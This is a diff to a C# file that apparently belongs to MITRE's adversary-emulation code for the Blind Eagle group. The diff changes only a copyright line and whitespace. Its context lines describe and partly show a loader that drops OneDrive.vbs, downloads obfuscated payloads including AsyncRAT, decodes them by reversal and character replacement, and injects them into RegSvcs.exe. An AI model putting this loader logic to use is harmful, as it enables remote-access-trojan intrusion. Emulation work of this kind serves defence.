@@ -6,8 +6,8 @@
 *          fiber.dll then downloads obfuscated rump.xls (fsociety.dll) and asy.txt (AsyncRAT) payloads
 *          fiber.dll does character replacement, unreverse, and base64 decodes prior to executing each payload and on the second URL (AsyncRAT)
 *          fiber.dll then loads fsociety.dll and calls the Ande function to inject AsyncRAT into RegSvcs.exe
- # © 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076
- 
+ # © 2023 The MITRE Corporation, LLC. Approved for Public Release. Document number CT0076
+
  # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at
 
  # http://www.apache.org/licenses/LICENSE-2.0
@@ -15,7 +15,7 @@
  # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
 
  # This project makes use of ATT&CK®
- # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 
+ # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/
 
 # Revision History:
 
@@ -39,7 +39,7 @@ namespace fiber
         {
             /*
              * [fiber.Home]::VAI()
-             *     About: 
+             *     About:
              *          fiber.dll uses PowerShell to copy the first stange loader as file called OneDrive.vbs and saves it in C:\Windows\Temp
              *          fiber.dll then downloads obfuscated rump.xls (fsociety.dll) and asy.txt (AsyncRAT) payloads
              *          fiber.dll does character replacement, unreverse, and base64 decodes prior to executing each payload and on the second URL (AsyncRAT)
@@ -54,7 +54,7 @@ namespace fiber
              *      CTI:
              *          https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
              *           https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/
-             *  
+             *
              */
             try
             {
@@ -83,7 +83,7 @@ namespace fiber
 
                 WebClient webClient = new WebClient();
                 webClient.Encoding = Encoding.UTF8;
-                
+
                 // Build the URL to download AsyncRAT
                 string address = Strings.StrReverse(Conversions.ToString(url)).Replace("(ø+(*", "b")
                                         .Replace("}░ú(}!", "c").Replace("▶ø�}4", "d").Replace("(◀▲*∞", "e")
